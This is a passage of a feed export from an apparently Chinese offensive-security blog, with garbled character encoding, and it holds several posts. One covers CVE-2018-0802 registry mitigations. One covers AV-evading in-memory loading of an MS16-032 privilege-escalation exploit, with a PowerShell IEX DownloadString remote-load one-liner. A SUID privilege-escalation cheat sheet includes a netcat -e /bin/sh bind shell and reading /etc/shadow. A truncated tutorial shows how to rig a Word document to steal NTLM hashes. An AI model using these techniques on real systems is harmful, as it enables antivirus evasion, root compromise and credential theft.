href="#è§£å†³æ–¹æ¡ˆ" class="headerlink" title="è§£å†³æ–¹æ¡ˆ"></a>è§£å†³æ–¹æ¡ˆ</h3><p>ä¸€ã€åŠæ—¶æ›´æ–°è¡¥ä¸</p><p>è¡¥ä¸ä¸‹è½½åœ°å€ï¼š</p><p><a href="https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2018-0802" target="_blank" rel="noopener">https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2018-0802</a></p><p>äºŒã€é€šè¿‡æ³¨å†Œè¡¨ç¦ç”¨æ­¤æ¨¡å—ï¼Œå¯é€šè¿‡ä¿®æ”¹æ³¨å†Œè¡¨ï¼Œç¦ç”¨ä»¥ä¸‹COMæ§ä»¶çš„æ–¹å¼è¿›è¡Œç¼“è§£ï¼Œå…¶ä¸­XX.Xä¸ºç‰ˆæœ¬å·</p><p>åœ¨è¿è¡Œä¸­è¾“å…¥ï¼š<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add â€œHKLM\SOFTWARE\Microsoft\Office\XX.X\Common\COMCompatibility\&#123;0002CE02-0000- 0000-C000-000000000046&#125;â€ /vâ€Compatibility Flagsâ€ /t REG_DWORD /d 0Ã—400</span><br></pre></td></tr></table></figure></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg addâ€HKLM\SOFTWARE\Wow6432Node\Microsoft\Office\XX.X\Common\COMCompatibility\&#123;0002CE02-0000-0000-C000-000000000046&#125;â€ /vâ€Compatibility Flagsâ€ /t REG_DWORD /d 0Ã—400</span><br></pre></td></tr></table></figure><p><strong><code>æ³¨ï¼šæ­¤è„šæœ¬åªæ˜¯ä¸ºäº†å®‰å…¨ç ”ç©¶ï¼Œåˆ‡å‹¿éæ³•ä½¿ç”¨ï¼ä½¿ç”¨æ­¤è„šæœ¬æ‰€é€ æˆçš„ä¸€åˆ‡æ³•å¾‹é—®é¢˜åŠåæœï¼Œæœ¬ç«™æ¦‚ä¸è´Ÿè´£ï¼</code></strong></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;åœ¨CVE-2017-11882ä¹‹åï¼Œ2018å¹´1æœˆä»½åˆå‡ºäº†ä¸€ä¸ªæ–°çš„â€œå™©æ¢¦å…¬å¼äºŒä»£â€ï¼Œåœ¨é‡æ ·æœ¬åµŒå…¥äº†åˆ©ç”¨Ndayæ¼æ´å’Œ0dayæ¼æ´çš„2ä¸ªå…¬å¼å¯¹è±¡åŒæ—¶è¿›è¡Œæ”»å‡»ï¼ŒNdayæ¼æ´å¯ä»¥æ”»å‡»æœªæ‰“è¡¥ä¸çš„ç³»ç»Ÿï¼Œ0dayæ¼æ´åˆ™æ”»å‡»å…¨è¡¥ä¸ç³»ç»Ÿï¼Œç»•è¿‡äº†CVE-2017-11882è¡¥ä¸çš„ASLRï¼ˆåœ°
      
    
    </summary>
    
      <category term="å¥‡æŠ€æ·«å·§" scheme="https://evi1cg.github.io/categories/%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/"/>
    
    
      <category term="office" scheme="https://evi1cg.github.io/tags/office/"/>
    
  </entry>
  
  <entry>
    <title>BypassAV With ReflectivePEInjection</title>
    <link href="https://evi1cg.github.io/archives/BypassAV_With_ReflectivePEInjection.html"/>
    <id>https://evi1cg.github.io/archives/BypassAV_With_ReflectivePEInjection.html</id>
    <published>2017-12-27T03:34:00.000Z</published>
    <updated>2019-01-16T05:14:25.237Z</updated>
    
    <content type="html"><![CDATA[<p>æœ‰æ—¶å€™ï¼Œä½¿ç”¨æŸäº›expè¿›è¡Œææƒçš„æ—¶å€™ï¼Œexpå¯èƒ½ä¼šè¢«æŸ¥æ€ï¼Œå½“ç„¶ï¼Œæœ‰æºç çš„è¯ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨æºç ä¸Šè¿›è¡Œä¿®æ”¹è¿›è¡Œå…æ€å¤„ç†ï¼Œä½†æ˜¯ä»Šå¤©ä»‹ç»çš„æ˜¯å¦å¤–ä¸€åªæ–¹æ³•ï¼Œå³ä½¿ç”¨PEloaderæ¥åŠ è½½expã€‚<br>powershellçš„PEloaderåœ¨<a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1" target="_blank" rel="noopener">è¿™é‡Œ</a>ï¼ŒæŸ¥çœ‹ä»£ç æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œè¿™ä¸ªè„šæœ¬ä½¿ç”¨éå¸¸ç®€å•ï¼Œå…·ä½“ä»£ç å¦‚ä¸‹ï¼š<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$PEBytes</span> = [IO.File]::ReadAllBytes(<span class="string">'DemoEXE.exe'</span>)</span><br><span class="line">Invoke-ReflectivePEInjection -PEBytes <span class="variable">$PEBytes</span> -ExeArgs <span class="string">"Arg1 Arg2 Arg3 Arg4"</span></span><br></pre></td></tr></table></figure></p><p>è·å–expçš„å­—èŠ‚æµï¼Œä¹‹åå†åœ¨å†…å­˜ä¸­åŠ è½½expï¼Œæ‰€ä»¥æ€è·¯ä¹Ÿå¾ˆç®€å•ï¼Œæˆ‘ä»¬åªéœ€è¦æŠŠéœ€è¦çš„expè½¬æ¢æˆå­—ç¬¦ä¸²ï¼Œå†™å…¥è„šæœ¬ï¼Œå°±å¯ä»¥æ„é€ ä¸€ä¸ªpowershellè„šæœ¬ã€‚</p><p>è¿™é‡Œæ•´ç†äº†ä¸€ä¸ªè„šæœ¬æ–¹ä¾¿è½¬æ¢ï¼š<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> Convert-BinaryToString &#123;</span><br><span class="line">   [CmdletBinding()] <span class="keyword">param</span> (</span><br><span class="line">      [string] <span class="variable">$FilePath</span></span><br><span class="line">   )</span><br><span class="line">   <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="variable">$ByteArray</span> = [System.IO.File]::ReadAllBytes(<span class="variable">$FilePath</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">catch</span> &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="string">"Failed to read file. Ensure that you have permission to the file, and that the file path is correct."</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">if</span> (<span class="variable">$ByteArray</span>) &#123;</span><br><span class="line">      <span class="variable">$Base64String</span> = [System.Convert]::ToBase64String(<span class="variable">$ByteArray</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="string">'$ByteArray is $null.'</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="variable">$Base64String</span> | <span class="built_in">set-content</span> (<span class="string">"b64.txt"</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>ä½¿ç”¨zcgonvhçš„16032åšæ¼”ç¤ºã€‚ä½¿ç”¨è„šæœ¬è½¬æ¢ï¼š<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\evi1cg\Desktop\<span class="number">16</span>_032&gt; . .\Convert-BinaryToString.ps1</span><br><span class="line">PS C:\Users\evi1cg\Desktop\<span class="number">16</span>_032&gt; Convert-BinaryToString -FilePath .\ms16-<span class="number">032</span>_x64.exe</span><br></pre></td></tr></table></figure></p><p>ç”Ÿæˆbase64çš„å­—ç¬¦ä¸²å¹¶å­˜å‚¨åœ¨b64.txtä¸­ã€‚<br><img src="https://evi1cg.github.io/usr/uploads/2017/12/3522762171.png" alt="4B544212-75E6-4CAD-839C-18F77CA759EA.png"></p><p>ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤è¿›è¡Œè½¬æ¢ï¼š<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$InputString</span> = <span class="string">"base64string"</span></span><br><span class="line"><span class="variable">$PEBytes</span> = [System.Convert]::FromBase64String(<span class="variable">$InputString</span>)</span><br></pre></td></tr></table></figure></p><p>ä¹‹åå°±å¯ä»¥ä½¿ç”¨<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-ReflectivePEInjection -PEBytes <span class="variable">$PEBytes</span></span><br></pre></td></tr></table></figure></p><p>è¿›è¡ŒåŠ è½½ï¼Œæœ€ååˆ†äº«ä¸€ä¸‹æœ€ç»ˆçš„è„šæœ¬ï¼š</p><p><a href="https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/E2P_MS16-032.ps1" target="_blank" rel="noopener">E2P_MS16-032.ps1</a></p><p>ä½¿ç”¨æ–¹å¼ä¸ºï¼š<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">E2P_MS16-<span class="number">032</span> -Command <span class="string">'"net user"'</span></span><br></pre></td></tr></table></figure></p><p><img src="https://evi1cg.github.io/usr/uploads/2017/12/3827318615.jpg" alt="photo_2017-12-27_20-07-13.jpg"></p><p>è„šæœ¬GITï¼š<a href="https://github.com/ridter/pentest" target="_blank" rel="noopener">Pentest</a>ã€‚</p><p>è¿œç¨‹åŠ è½½å‘½ä»¤ï¼š<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -nop -exec bypass -c <span class="string">"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/E2P_MS16-032.ps1');E2P_MS16-032 -Command '\"</span>whoami\<span class="string">"'"</span></span><br></pre></td></tr></table></figure></p><p><img src="https://evi1cg.github.io/usr/uploads/2017/12/873755257.png" alt="717403C9-86AA-4594-A35F-9D0A1307088C.png"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;æœ‰æ—¶å€™ï¼Œä½¿ç”¨æŸäº›expè¿›è¡Œææƒçš„æ—¶å€™ï¼Œexpå¯èƒ½ä¼šè¢«æŸ¥æ€ï¼Œå½“ç„¶ï¼Œæœ‰æºç çš„è¯ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨æºç ä¸Šè¿›è¡Œä¿®æ”¹è¿›è¡Œå…æ€å¤„ç†ï¼Œä½†æ˜¯ä»Šå¤©ä»‹ç»çš„æ˜¯å¦å¤–ä¸€åªæ–¹æ³•ï¼Œå³ä½¿ç”¨PEloaderæ¥åŠ è½½expã€‚&lt;br&gt;powershellçš„PEloaderåœ¨&lt;a href=&quot;https://github
      
    
    </summary>
    
      <category term="å¥‡æŠ€æ·«å·§" scheme="https://evi1cg.github.io/categories/%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/"/>
    
    
      <category term="Powershell" scheme="https://evi1cg.github.io/tags/Powershell/"/>
    
      <category term="bypassav" scheme="https://evi1cg.github.io/tags/bypassav/"/>
    
  </entry>
  
  <entry>
    <title>SUID Privilege Escalation</title>
    <link href="https://evi1cg.github.io/archives/SUID_Privilege_Escalation.html"/>
    <id>https://evi1cg.github.io/archives/SUID_Privilege_Escalation.html</id>
    <published>2017-12-19T19:49:00.000Z</published>
    <updated>2019-01-14T14:44:26.000Z</updated>
    
    <content type="html"><![CDATA[<p>Linuxææƒä¸­ï¼Œå¯ä»¥ç”¨çš„SUIDæ–‡ä»¶æ¥ææƒï¼ŒSUIDçš„ä½œç”¨å°±æ˜¯ï¼šè®©æœ¬æ¥æ²¡æœ‰ç›¸åº”æƒé™çš„ç”¨æˆ·è¿è¡Œè¿™ä¸ªç¨‹åºæ—¶ï¼Œå¯ä»¥è®¿é—®æ²¡æœ‰æƒé™è®¿é—®çš„èµ„æºã€‚é€šå¸¸å¯ä»¥ä½¿ç”¨ä¸€ä¸‹å‘½ä»¤æ¥æ‰¾æœ‰SUIDæ ‡å¿—ä½çš„æ–‡ä»¶ï¼š<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -<span class="built_in">print</span> 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -<span class="built_in">exec</span> ls -ldb &#123;&#125; \;</span><br></pre></td></tr></table></figure></p><p>ä¾‹å¦‚nmap<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls -l /usr/bin/nmap</span><br><span class="line">-rwsr-xr-x 1 root root 780676 2008-04-08 10:04 /usr/bin/nmap</span><br></pre></td></tr></table></figure></p><p>å­˜åœ¨<strong>s</strong> åˆ™è¡¨ç¤ºå…¶å­˜åœ¨SUIDæ ‡å¿—ä½ï¼Œå¹¶æ‹¥æœ‰rootçš„æ‰§è¡Œæƒé™ã€‚ä»¥ä¸‹æ˜¯å‡ ç±»å¯ç”¨äºææƒçš„æ–‡ä»¶æ€»ç»“ï¼š</p><h2 id="1-Nmap"><a href="#1-Nmap" class="headerlink" title="1.Nmap"></a>1.Nmap</h2><p>è€ç‰ˆæœ¬çš„nmapï¼ˆ2.02-5.21ï¼‰æœ‰ interactiveï¼Œæ˜¯å…è®¸ç”¨æˆ·æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„ã€‚ææƒæ–¹å¼<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --interactive</span><br></pre></td></tr></table></figure></p><p>ä¹‹åæ‰§è¡Œå‘½ä»¤ï¼š<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap&gt; !sh</span><br><span class="line">sh-3.2<span class="comment"># whoami</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure></p><p>msfä¸­çš„æ¨¡å—ä¸ºï¼š<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit/unix/<span class="built_in">local</span>/setuid_nmap</span><br></pre></td></tr></table></figure></p><h2 id="2-Find"><a href="#2-Find" class="headerlink" title="2.Find"></a>2.Find</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">touch <span class="built_in">test</span></span><br><span class="line">find <span class="built_in">test</span> -<span class="built_in">exec</span> whoami \;</span><br></pre></td></tr></table></figure><p>å¦‚æœæœåŠ¡å™¨ä¸Šè£…äº†ncï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤è¿›è¡Œç›‘å¬ï¼š<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find <span class="built_in">test</span> -<span class="built_in">exec</span> netcat -lvp 5555 -e /bin/sh \;</span><br></pre></td></tr></table></figure></p><p>ä¹‹åè¿›è¡Œè¿æ¥ï¼š<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netcat 192.168.1.100 5555</span><br></pre></td></tr></table></figure></p><p>åˆ™å¯è·å–root shell</p><h2 id="3-vim-vi"><a href="#3-vim-vi" class="headerlink" title="3.vim/vi"></a>3.vim/vi</h2><p>æ‰“å¼€vim,æŒ‰ä¸‹ESC<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">:<span class="built_in">set</span> shell=/bin/sh</span><br><span class="line">:shell</span><br></pre></td></tr></table></figure></p><p>åˆ™å¯æ‰§è¡Œå‘½ä»¤</p><h2 id="4-bash"><a href="#4-bash" class="headerlink" title="4.bash"></a>4.bash</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bash -p</span><br><span class="line">bash-3.2<span class="comment"># id</span></span><br><span class="line">uid=1002(service) gid=1002(service) euid=0(root) groups=1002(service)</span><br></pre></td></tr></table></figure><h2 id="5-less"><a href="#5-less" class="headerlink" title="5.less"></a>5.less</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">less /etc/passwd</span><br><span class="line">!/bin/sh</span><br></pre></td></tr></table></figure><h2 id="6-more"><a href="#6-more" class="headerlink" title="6.more"></a>6.more</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">more /home/pelle/myfile</span><br><span class="line">!/bin/bash</span><br></pre></td></tr></table></figure><h2 id="7-cp"><a href="#7-cp" class="headerlink" title="7.cp"></a>7.cp</h2><p>ä½¿ç”¨cpè¦†ç›– /etc/shadow</p><h2 id="8-mv"><a href="#8-mv" class="headerlink" title="8.mv"></a>8.mv</h2><p>ä½¿ç”¨mv è¦†ç›– /etc/shadow æˆ–è€…/etc/sudoers</p><h2 id="9-awk"><a href="#9-awk" class="headerlink" title="9.awk"></a>9.awk</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk <span class="string">'BEGIN &#123;system("/bin/bash")&#125;'</span></span><br></pre></td></tr></table></figure><h2 id="10-man"><a href="#10-man" class="headerlink" title="10.man"></a>10.man</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">man passwd</span><br><span class="line">!/bin/bash</span><br></pre></td></tr></table></figure><h2 id="11-python-perl-ruby-lua-etc"><a href="#11-python-perl-ruby-lua-etc" class="headerlink" title="11.python/perl/ruby/lua/etc"></a>11.python/perl/ruby/lua/etc</h2><p>perl<br><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">exec</span> <span class="string">"/bin/bash"</span>;</span><br></pre></td></tr></table></figure></p><p>python<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.system(<span class="string">"/bin/bash"</span>)</span><br></pre></td></tr></table></figure></p><h2 id="12-tcpdump"><a href="#12-tcpdump" class="headerlink" title="12.tcpdump"></a>12.tcpdump</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> $<span class="string">'id\ncat /etc/shadow'</span> &gt; /tmp/.<span class="built_in">test</span></span><br><span class="line">chmod +x /tmp/.<span class="built_in">test</span></span><br><span class="line">sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.<span class="built_in">test</span> -Z root</span><br></pre></td></tr></table></figure><p>æ¬¢è¿è¡¥å……ã€‚</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Linuxææƒä¸­ï¼Œå¯ä»¥ç”¨çš„SUIDæ–‡ä»¶æ¥ææƒï¼ŒSUIDçš„ä½œç”¨å°±æ˜¯ï¼šè®©æœ¬æ¥æ²¡æœ‰ç›¸åº”æƒé™çš„ç”¨æˆ·è¿è¡Œè¿™ä¸ªç¨‹åºæ—¶ï¼Œå¯ä»¥è®¿é—®æ²¡æœ‰æƒé™è®¿é—®çš„èµ„æºã€‚é€šå¸¸å¯ä»¥ä½¿ç”¨ä¸€ä¸‹å‘½ä»¤æ¥æ‰¾æœ‰SUIDæ ‡å¿—ä½çš„æ–‡ä»¶ï¼š&lt;br&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;
      
    
    </summary>
    
      <category term="å¥‡æŠ€æ·«å·§" scheme="https://evi1cg.github.io/categories/%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/"/>
    
    
      <category term="Privilege Escalation" scheme="https://evi1cg.github.io/tags/Privilege-Escalation/"/>
    
  </entry>
  
  <entry>
    <title>é€šè¿‡Microsoft Office çªƒå– NTLM Hashes</title>
    <link href="https://evi1cg.github.io/archives/Get_NTLM_Hashes.html"/>
    <id>https://evi1cg.github.io/archives/Get_NTLM_Hashes.html</id>
    <published>2017-12-19T19:02:00.000Z</published>
    <updated>2019-01-15T05:43:36.769Z</updated>
    
    <content type="html"><![CDATA[<p>ä¹‹å‰æœ‰äººæ€»ç»“äº†å¾ˆå¤šç§çªƒå–NTLM hashçš„æ–¹æ³•ï¼Œ<a href="https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/" target="_blank" rel="noopener">åŸæ–‡</a>,<a href="https://paper.seebug.org/474/" target="_blank" rel="noopener">è¯‘æ–‡</a>ã€‚é‡Œé¢å†™çš„æ–¹æ³•å·²ç»å¾ˆå¤šäº†ï¼Œæœ€è¿‘ä»<a href="https://pentestlab.blog/2017/12/18/microsoft-office-ntlm-hashes-via-frameset/" target="_blank" rel="noopener">è¿™é‡Œ</a>åˆå­¦åˆ°äº†ä¸€ä¸ªæ–°çš„æ–¹æ³•ï¼Œæ‰€ä»¥åœ¨è¿™é‡Œè¿›è¡Œä¸€ä¸‹åˆ†äº«ï¼Œä¹Ÿç®—æ˜¯ä¸€ä¸ªè¡¥å……ã€‚</p><p>å†å²ä¸Šï¼ŒMicrosoft Wordè¢«ç”¨ä½œHTMLç¼–è¾‘å™¨ã€‚è¿™æ„å‘³ç€å®ƒå¯ä»¥æ”¯æŒHTMLå…ƒç´ ï¼Œä¾‹å¦‚æ¡†æ¶é›†ã€‚å› æ­¤ï¼Œå¯ä»¥å°†Microsoft Wordæ–‡æ¡£ä¸UNCè·¯å¾„é“¾æ¥èµ·æ¥ï¼Œå¹¶å°†å…¶ä¸å“åº”ç¨‹åºç»“åˆï¼Œä»¥ä¾¿ä»å¤–éƒ¨æ•è·NTLMå“ˆå¸Œå€¼ã€‚å¸¦æœ‰docxæ‰©å±•åçš„Wordæ–‡æ¡£å®é™…ä¸Šæ˜¯ä¸€ä¸ªåŒ…å«å„ç§XMLæ–‡æ¡£çš„zipæ–‡ä»¶ã€‚è¿™äº›XMLæ–‡ä»¶æ­£åœ¨æ§åˆ¶ä¸»é¢˜ï¼Œå­—ä½“ï¼Œæ–‡æ¡£çš„è®¾ç½®å’ŒWebè®¾ç½®ã€‚</p><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ–°å»ºä¸€ä¸ªä»»æ„æ–‡æ¡£ï¼Œå¹¶ç”¨å‹ç¼©åŒ…æ¥æ‰“å¼€ä»–ã€‚</p><p><img src="https://evi1cg.github.io/usr/uploads/2017/12/72758607.png" alt="1513736341443.png"></p><p>åœ¨<em><code>word</code></em> ç›®å½•ä¸‹æœ‰ä¸€ä¸ªwebSettings.xmlã€‚æˆ‘ä»¬å¯¹è¿™ä¸ªæ–‡ä»¶è¿›è¡Œä¿®æ”¹ï¼Œæ·»åŠ ä»¥ä¸‹ä»£ç åˆ™ä¼šåˆ›å»ºä¸å¦å¤–ä¸€ä¸ªæ–‡ä»¶çš„é“¾æ¥ã€‚<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">w:frameset</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">w:framesetSplitbar</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">w:w</span> <span class="attr">w:val</span>=<span class="string">"60"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">w:color</span> <span class="attr">w:val</span>=<span class="string">"auto"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">w:noBorder</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">w:framesetSplitbar</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">w:frameset</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">w:frame</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">w:name</span> <span class="attr">w:val</span>=<span class="string">"3"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">w:sourceFileName</span> <span class="attr">r:id</span>=<span class="string">"rId1"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">w:linkedToFile</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">w:frame</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">w:frameset</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">w:frameset</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>æœ€ç»ˆä¿®æ”¹åçš„webSettings.xmlå¦‚ä¸‹ï¼š<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8" standalone="yes"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">w:webSettings</span> <span class="attr">xmlns:mc</span>=<span class="string">"http://schemas.openxmlformats.org/markup-compatibility/2006"</span> <span class="attr">xmlns:r</span>=<span class="string">"http://schemas.openxmlformats.org/officeDocument/2006/relationships"</span> <span class="attr">xmlns:w</span>=<span class="string">"http://schemas.openxmlformats.org/wordprocessingml/2006/main"</span> <span class="attr">xmlns:w14</span>=<span class="string">"http://schemas.microsoft.com/office/word/2010/wordml"</span> <span class="attr">mc:Ignorable</span>=<span class="string">"w14"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">w:frameset</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">w:framesetSplitbar</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">w:w</span> <span class="attr">w:val</span>=<span class="string">"60"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">w:color</span> <span class="attr">w:val</span>=<span class="string">"auto"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">w:noBorder</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">w:framesetSplitbar</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">w:frameset</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">w:frame</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">w:name</span> <span class="attr">w:val</span>=<span class="string">"3"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">w:sourceFileName</span> <span class="attr">r:id</span>=<span class="string">"rId1"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">w:linkedToFile</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">w:frame</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">w:frameset</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">w:frameset</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">w:optimizeForBrowser</span>/&gt;</span><span class="tag">&lt;<span class="name">w:allowPNG</span>/&gt;</span><span class="tag">&lt;/<span class="name">w:webSettings</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>ç°åœ¨æˆ‘ä»¬æŠŠæ–°çš„webSettings.xmlæ›¿æ¢åŸæ¥çš„webSettings.xmlï¼Œä¹‹ååœ¨wordç›®å½•ä¸‹çš„_relsç›®å½•åˆ›å»ºä¸€ä¸ªæ–°çš„æ–‡ä»¶ <em><code>webSettings.xml.rels</code></em>ï¼Œæ–‡ä»¶å†…å®¹å¦‚ä¸‹ï¼š<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8" standalone="yes"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Relationships</span></span></span><br><span class="line"><span class="tag"><span class="attr">xmlns</span>=<span class="string">"http://schemas.openxmlformats.org/package/2006/relationships"</span>&gt;</span></span><br><span class="line"><span 